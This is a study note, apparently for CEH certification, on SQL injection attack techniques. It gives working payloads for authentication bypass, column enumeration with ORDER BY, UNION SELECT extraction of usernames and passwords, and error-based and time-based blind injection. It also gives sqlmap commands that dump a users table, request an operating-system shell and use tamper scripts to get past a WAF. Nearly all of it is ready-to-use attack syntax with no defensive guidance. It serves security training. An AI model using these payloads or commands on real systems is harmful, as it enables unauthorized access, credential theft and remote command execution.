# 02. Attack Techniques — SQL Injection

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 15). Covers Authentication Bypass, Column Enumeration via ORDER BY, UNION SELECT Data Extraction, Error-Based Extraction, Time-Based Blind Exploitation, and SQLmap Automation syntax.

---

## ⚔️ 1. Primary Exploitation Workflows

### 1.1 Authentication Bypass Workflow
An attacker inputs `' OR 1=1 --` into a login form username parameter:
```sql
-- Original Query:
SELECT * FROM users WHERE username = '$user' AND password = '$password';

-- Executed Query:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '$password';
```
Since `1=1` evaluates to True, the query returns the first user record (typically `admin`), bypassing password verification.

### 1.2 UNION-Based Data Exfiltration Workflow

#### Step 1: Determine Column Count via `ORDER BY`
```sql
' ORDER BY 1 --  (Success)
' ORDER BY 2 --  (Success)
' ORDER BY 3 --  (Error: Unknown column) -> 2 Columns exist
```

#### Step 2: Determine Data Types & Dump Version
```sql
' UNION SELECT NULL, NULL --
' UNION SELECT @@version, user() --
```

#### Step 3: Dump Tables and Columns (`information_schema`)
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username, password FROM users --
```

> [!DANGER] 🛡️ **📋 Comprehensive SQL Injection Payload Matrix**

| Attack Type | Vulnerable Input | Test Payload Syntax | Target Result |
| :--- | :--- | :--- | :--- |
| **Auth Bypass** | Login Username | `' OR 1=1 --` | Authenticates as administrator |
| **UNION-Based** | ID Parameter | `1 UNION SELECT 1, @@version, 3` | Dumps DB version in page |
| **Error-Based** | Search Field | `' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --` | Forces version disclosure in error |
| **Time-Based** | Category Parameter | `1' AND SLEEP(5) --` | Delays HTTP response by 5s |

---

## 🛡️ 2. SQLmap Command-Line Execution Syntax

```bash
# 1. Basic SQLmap Scan on Vulnerable Target URL
sqlmap -u "http://192.168.1.50/view.php?id=1" --batch

# 2. Enumerate Databases, Tables, and Dump Users Table
sqlmap -u "http://192.168.1.50/view.php?id=1" --dbs
sqlmap -u "http://192.168.1.50/view.php?id=1" -D target_db -T users --dump

# 3. Request OS Interactive Shell (Requires DBA / SA privileges)
sqlmap -u "http://192.168.1.50/view.php?id=1" --os-shell

# 4. Use Tamper Script to Bypass WAF Filtering
sqlmap -u "http://192.168.1.50/view.php?id=1" --tamper=space2comment.py,randomcase.py
```
